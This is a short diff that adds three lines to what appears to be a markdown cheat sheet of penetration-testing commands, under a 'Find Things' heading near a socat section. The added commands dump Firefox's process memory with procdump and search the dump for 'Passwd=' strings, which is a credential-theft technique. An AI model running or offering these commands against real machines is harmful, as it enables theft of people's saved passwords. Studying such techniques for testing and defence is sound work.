@@ -70,6 +70,10 @@ LISTEN: Specifies that socat should listen for incoming connections on the socke
 ```
 ### Find Things
 ```
+# Getting passwords from browser memory
+procdump.exe -ma firefox_pid
+strings.exe firefox.dmp | findstr /i "Passwd="
+
 
 To find things:
 
